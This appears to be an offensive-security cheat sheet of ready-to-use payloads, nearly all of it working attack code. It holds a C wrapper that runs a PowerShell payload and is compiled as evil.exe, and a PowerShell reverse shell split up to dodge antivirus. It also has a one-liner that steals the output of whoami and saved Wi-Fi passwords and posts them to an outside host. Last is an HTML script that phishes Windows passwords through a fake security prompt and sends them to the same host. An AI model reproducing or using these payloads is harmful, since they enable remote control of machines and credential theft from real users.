## C

- Base powershell execute template

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_LENGTH 10000

int main()
{
    char cmd[MAX_LENGTH];
    strcpy(cmd, "powershell.exe");
    strcat(cmd, " -Command \"<payload>\"");
    system(cmd);
    return 0;
}
```

- To compile in linux

```bash
i686-w64-mingw32-gcc -o evil.exe evil.c
```
## Powershell

- Reverse TCP
```powershell
# this is split in parts because the AV keeps flaging this file as malicious. Combine all parts into one string.

# part 1
$client = New-Object
# part 2
System.Net.Sockets.TCPClient("<attacker-ip>",<port>);
# part 3 follows bellow...
```

```powershell
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

- HTTP POST Request

```powershell
# this will get `whoami` and wifi keys
$w=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((whoami /all)));$arr=@(); foreach ($n in (netsh wlan show profile | Select-String "Profile\s*:\s*(\S+)" -AllMatches | % { $_.Matches } | % { $_.Groups[1].Value })) { $arr+=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((netsh wlan show profile name=$n key=clear | Select-String "(SSID name)|(Key Content)"))); $arr+="&"};$wifi=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(($arr)));$b=@{whoami=$w,wifi=$wifi};$a=Invoke-WebRequest -Method POST -Uri "https://ce71n3c2vtc0000afs80g8do4tayyyyyb.oast.fun" -Body $b
```

## HTML

* Tip: use [GoClone](https://github.com/imthaghost/goclone) to clone websites.

- Custom script that requests for user creds and upload them to an attacker-controlled website

```html
<script>
    function showPrompt(){
        for (var i=0; i < 2; i++){
        var creds = prompt("Windows Security\n\nType your Windows password to view file contents", "", "Windows Security")
        if (i == 0){
            alert("Incorrect password, please try again")
        }
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://ce71n3c2vtc0000afs80g8do4tayyyyyb.oast.fun/confidential", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("creds=" + creds);
        }
    }
    showPrompt()
</script>
```